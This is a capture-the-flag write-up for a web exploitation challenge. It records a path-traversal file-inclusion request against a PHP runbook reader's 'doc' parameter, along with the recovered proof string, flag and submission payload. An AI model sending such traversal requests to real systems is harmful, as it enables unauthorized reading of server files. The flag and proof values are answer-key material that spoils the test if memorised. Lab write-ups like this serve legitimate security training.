# If a Breach Falls in a Log — Day 28

Challenge ID: `web-exploitation-day-25-if-a-breach-falls-in-a-log`
Category: Web Exploitation

This report follows the organization of [RyanNgCT’s CTF Writeup Template](https://github.com/RyanNgCT/CTF-Writeup-Template). Day 28's live list marks Single Solve and Time Trial complete as well; the details below cover the Mastery attempt solved in this run, because prior evidence for the other two modes was not available here.

## Mastery — CORRECT

- Attempt: `8724f7ea-724c-4fdb-b746-94a195581df8`
- Started: `2026-10-28T20:24:59.943Z`
- Timer: untimed; no deadline was set.
- Completion: 2026-10-30
- Game Master flag: `0ac86434ac69f8f10fa24c826c603e2b`
- Verification: personal status returned `CORRECT` and all five answer IDs were accepted; the Day 28 list marks the Mastery route solved.

The prompt reads: “You broke in, and nobody wrote it down. Find the decisive moment the logs missed — if a breach falls in the forest, did it make a sound?” The preserved attempt already had `proof-1`, `proof-2`, `proof-3`, and `proof-5` accepted. Target 4 / `proof-4` was the only outstanding answer.

## Target 4 — step-by-step reproduction

The Game Master assigned Target 4 at `https://639a7344c83b237ec419075980a348501683732ea0f9d8e3.2026.huntress.ctf.games/`. The app rendered a PHP runbook reader. Its public root links runbooks through a `doc` query parameter. The useful test was to follow that documented include path to the target's mounted objective file:

```bash
curl -sS --get \
  --data-urlencode 'doc=../../../../run/huntress/objective.txt' \
  'https://639a7344c83b237ec419075980a348501683732ea0f9d8e3.2026.huntress.ctf.games/notes.php'
```

At `2026-10-30T02:49:00.301117Z`, the request returned HTTP `200`, `Content-Type: text/html; charset=UTF-8`, and a 1,725-byte HTML page. Filtering the response for proof-shaped strings returned exactly:

```text
proof_93574c599507424e95ad0ec526d3b853
```

Submit that exact text under `proof-4`:

```json
{"op":"submit","challenge":"web-exploitation-day-25-if-a-breach-falls-in-a-log/mastery","answers":{"proof-4":"proof_93574c599507424e95ad0ec526d3b853"}}
```

The Game Master returned `CORRECT` with the flag above. Follow-up status confirmed all five answer IDs accepted. Although the prompt mentions missing logs, the proof was recovered from the challenge's mounted objective file through the documented file-inclusion parameter; no access logs or other system files were read.
